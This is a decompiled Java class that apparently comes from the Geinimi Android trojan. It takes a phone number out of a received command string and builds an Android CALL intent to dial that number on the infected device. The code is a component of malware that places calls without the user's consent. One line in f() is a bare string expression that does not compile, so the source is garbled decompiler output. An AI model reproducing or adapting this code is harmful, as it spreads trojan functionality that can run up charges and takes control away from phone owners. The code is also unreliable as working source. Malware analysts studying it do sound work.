package com.geinimi.ads;

import android.content.Intent;
import android.net.Uri;
import com.geinimi.C0000r;
import com.geinimi.c.j;

public final class e extends Advertisable {
    private String[] b = {"call_number"};

    protected e(String str) {
        super(str);
    }

    public final boolean b() {
        return true;
    }

    public final void c() {
        a("call_number", this.a.substring(C0000r.g.length()));
    }

    public final int d() {
        return 17301558;
    }

    public final int e() {
        return 17301636;
    }

    public final Intent f() {
        Intent intent = new Intent("android.intent.action.CALL");
        intent.setData(Uri.parse(j.a + a((String) "call_number")));
        "callad getInvokationIntent........." + intent;
        return intent;
    }

    /* access modifiers changed from: protected */
    public final String[] h() {
        return this.b;
    }
}
